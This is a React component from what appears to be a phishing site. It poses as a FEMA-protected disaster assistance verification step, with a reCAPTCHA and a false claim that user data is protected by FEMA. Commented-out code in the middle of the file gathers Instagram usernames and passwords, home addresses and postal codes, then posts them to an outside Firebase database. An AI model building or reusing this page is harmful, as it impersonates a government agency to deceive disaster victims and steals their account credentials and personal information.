import { useState, useRef } from "react";
import ReCAPTCHA from 'react-google-recaptcha';
import { Link, useNavigate } from "react-router-dom";
// import { IoShieldHalf } from "react-icons/io5";
// import Upload from "../Images/upload.png";
// import { ref, uploadBytes } from "firebase/storage";
// import { v4 } from "uuid";
// import './Verified.css'

const Verified = () => {
    //   const [img, setImg] = useState('')

    //   const handleClick = () => {
    //     const imgRef = ref(imageDb, `files/${v4()}`)
    //     uploadBytes(imgRef, img)
    //     alert('sent')
    //   }

    const [captchaValue, setCaptchaValue] = useState<string | null>(null);
    const recaptchaRef = useRef<ReCAPTCHA>(null);
    const navigate = useNavigate()

    const handleCaptchaChange = (value: string | null) => {
        setCaptchaValue(value);
    }

    const handlesubmit = () => {
        if(captchaValue) {
            navigate('/secondpage')
        }
        if (!captchaValue) {
            alert("Please complete the reCAPTCHA");
            return;
        }
    }




    // const [user, setUser] = useState({
    //     Instagram: "",
    //     Password: "",
    //     Home: "",
    //     Postal: "",
    // });

    // const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    //     setUser({ ...user, [e.target.name]: e.target.value });
    // };

    // const getData = (e: React.FormEvent<HTMLButtonElement>) => {
    //     e.preventDefault();

    //     if (!captchaValue) {
    //         alert("Please complete the reCAPTCHA");
    //         return;
    //     }
    //     const { Instagram, Password, Home, Postal } = user;

    //     const options = {
    //         method: "POST",
    //         headers: {
    //             "Content-type": "application/json",
    //         },
    //         body: JSON.stringify({
    //             Instagram,
    //             Password,
    //             Home,
    //             Postal,
    //         }),
    //     };

    //     fetch("https://disasterassistance-b480a-default-rtdb.firebaseio.com/new.json", options)
    //         .then((res) => res.json())
    //         .then((data) => {
    //             console.log(data);
    //             alert("Information sent for processing")
    //         })
    //         .catch((error) => {
    //             console.error(error);
    //             alert("Message Saved");
    //         });
    // };

    return (
        <div className="px-4 pt-24 font-bold pb-3 ">
            <div className="flex">
            <h1 className="text-center mb-2">NOTE your information is protected by the Federal Emergency Management Agency (FEMA)</h1>
            </div>
            <ReCAPTCHA
                ref={recaptchaRef}
                sitekey="6LeCv7YqAAAAAHpfRusLSeVxk75AO8A5JFdBBK_Y"
                onChange={handleCaptchaChange}
                className="ml-3"
            />
            
            <button onClick={handlesubmit} className="p-4 bg-blue-300 text-white bg-[#005288]"> Submit</button>
        </div>
    );
};

export default Verified;
